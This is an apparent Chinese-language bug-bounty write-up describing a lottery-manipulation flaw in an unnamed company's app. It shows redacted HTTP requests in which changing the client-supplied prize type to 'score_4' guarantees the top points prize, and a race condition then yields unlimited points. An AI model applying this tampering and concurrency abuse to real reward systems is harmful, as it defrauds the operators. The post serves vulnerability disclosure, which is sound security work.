#  某企业SRC的抽奖操控漏洞  
原创 安全小生
                    安全小生  安全小生   2026-10-31 01:29  
  
引言:看着手机app公众号助手，我chovy原来我还有一个公众号的呀，几个月没写文章了我都快忘记了，于是闲来无事分享一个有点抽象的漏洞案例  
  
  
此漏洞出现在该资产的一个抽奖功能，在抽奖之前我找到了该抽奖的配置信息  
/xxxx/game/config  
```
POST /xxxxxx/game/config HTTP/2
Host: xxxxxxx
Content-Type: application/json
Token: xxxxxxxx
Content-Length: 0
```  
```
HTTP/2 200 OK
Server: nginx
Date: 
Content-Type: application/json; charset=utf-8
Strict-Transport-Security: max-age=31536000

{"code":1,"msg":"成功","time":"","data":{"award":[{"class":"join","name":"谢谢参与","ratio":"40"},{"class":"again","name":"再来一次","ratio":"19"},{"class":"score_0","name":"10积分","ratio":"10"},{"class":"score_1","name":"20积分","ratio":"10"},{"class":"score_2","name":"30积分","ratio":"10"},{"class":"score_3","name":"40积分","ratio":"1"},{"class":"score_4","name":"100积分","ratio":"10"}],"note":"           <p>游戏规则1<\/p><p>游戏规则2<\/p><p>游戏规则3<\/p>","times":2}}
```  
  
通过分析发现 class是代表奖品的类型，name是实际的奖品名称，ratio是中奖概率  
  
随后抓了抽奖的包 发现  
```
POST /xxxxx/game/lottery HTTP/2
Host: xxxxx
Content-Type: application/json
Token: xxxxxx
Content-Length: 18


{"type":"score_0"}
```  
  
其实看到这一步 就能显而易见这个包就是操控你接下来所得到的奖品的  
  
故而只需要将type修改为  
score_4 就能直接获取100积分 ，刚好此处抽奖点也存在并发漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MIgO9EvXauiaP8wPC81DRxWU3fpLJ57STNUiazgicWq1BgRXGqadKrWPEke4OS2gILDkJEaQQu23xC9SKP6D01YIXavBDsTvgnZ2nxyqk9gJzI/640?wx_fmt=png&from=appmsg "")  
  
所以就能无限白嫖积分    
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/MIgO9EvXaug3oicAq5FOwPmUKacdiasvqOXN9yA3M9Ught8fOfMAXkMJ7sgS2rlzNFmnn6eyBHzdmbPAafsXRrHlE2Asv1eJlj0vJPyZe5R5A/640?wx_fmt=jpeg&from=appmsg "")  
  
  
可惜该资产的积分作用主要是抵消一些场景的金额消耗，所以危害不算大  
  
  
